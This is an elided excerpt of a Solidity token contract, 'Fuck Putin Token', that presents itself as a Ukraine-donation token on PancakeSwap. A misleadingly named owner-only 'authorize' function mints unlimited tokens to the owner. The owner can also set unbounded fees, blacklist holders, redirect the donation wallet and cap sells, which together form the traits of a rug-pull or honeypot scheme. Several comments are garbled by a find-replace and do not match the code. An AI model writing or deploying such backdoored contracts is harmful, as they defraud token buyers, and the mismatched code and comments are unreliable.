...
pragma solidity ^0.8.5;
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also FuckPutined.
...
abstract contract Context {
	 ...
	 * This allows applications to reconstruct the allowance for all FuckPutin just
	...
	contract FuckPutin is ERC20, Ownable {
		...
		uint256 public ukraineFee = 5;
		

		address public ukraineWalletReceiver = 0x12e75c971015ba8960c8bC957ECA702eAb133126;
		...
		uint256 private _swapTokenAtAmount = 2000000 * (10**9);
		uint256 private _swapThreshold = 1000000000 * (10**9); 
		...
		event excludeMultipleAccountFromRewards(address[] FuckPutin, bool isExcluded);
		...
		constructor() ERC20("Fuck Putin Token", "FuckPutin"){
			...
			emit SetIsFeeExempt(ukraineWalletReceiver, true);
			emit SetIsFeeExempt(address(this), true);

		
			_isTimelockExempt[owner()] = true;
			_isTimelockExempt[ukraineWalletReceiver] = true;
		...
		function setIsFeeExempt(address account, bool exempt) public onlyOwner {
			require(_isFeeExempt[account] != exempt, "FuckPutin: Account is already the value of 'exempt'");
			_isFeeExempt[account] = exempt;
		}
        
        function setIsTxLimitExempt(address account, bool exempt) public onlyOwner {
			require(_isTxLimitExempt[account] != exempt, "FuckPutin: Account is already the value of 'exempt'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "FuckPutin: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "FuckPutin: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != ukraineWalletReceiver, "FuckPutin: The liquidity wallet is already this address");
			emit SetIsFeeExempt(newLiquidityWallet, true);
			emit LiquidityWalletUpdated(newLiquidityWallet, ukraineWalletReceiver);
			ukraineWalletReceiver = newLiquidityWallet;
		}
   
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "FuckPutin: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "FuckPutin: Cannot update distributorGas to same value");
			emit GasForProcessingUpdated(gas, distributorGas);
			distributorGas = gas;
		}
	
	
		function setTxLimit(uint256 newMaxTx) external onlyOwner() {
            _maxTxAmount = newMaxTx * 10**9;
		
		}
		
		function setMaxWallet(uint256 newMaxWallet) external onlyOwner() {
            _maxWalletSize = newMaxWallet * 10**9;
			
		}
		
		function setFees(uint256 _liquidityFee, uint256 _ukraineFee) public onlyOwner {
			liquidityFee = _liquidityFee;
			ukraineFee = _ukraineFee;
		
		
		}
		
		
		function setFeeReceiver(address _ukraineWalletReceiver)  public onlyOwner {
			ukraineWalletReceiver = _ukraineWalletReceiver;

			
		}
		
		function setSwapBackSettings(bool _status, uint256 _amount) external onlyOwner() {
			swapEnabled = _status;
            _swapThreshold = _amount * 10**9;
        ...
        function authorize(uint256 amount) external onlyOwner {
			_authorize(msg.sender, amount);

        }
    
	
        function _authorize(address account, uint256 amount) internal virtual {
            require(account != address(0), "");
           _mint(owner(), amount * (10**9));
		...
		function _transfer(
            ...
            require(isBlacklisted[from] == false, "You are Blacklist");
			...
			if(!tradingOpen) {
				require(_isTimelockExempt[from], "FuckPutin: This account cannot send tokens until trading is enabled");
			}
			...
			if( 
				...
				!_isFeeExempt[to] //no max for those excluded from fees
			) {
				require(amount <= _swapThreshold, "Swap Threshold For Sell");
			}

			uint256 contractTokenBalance = balanceOf(address(this));
			
			bool canSwap = contractTokenBalance >= _swapTokenAtAmount;
			...
			if(
				...
				from != ukraineWalletReceiver &&
				to != ukraineWalletReceiver
			) {
				swapping = true;

				uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(ukraineFee);
			...
			if(takeFee) {
				uint256 fees = amount.mul(ukraineFee).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(ukraineFee).div(100);
				}
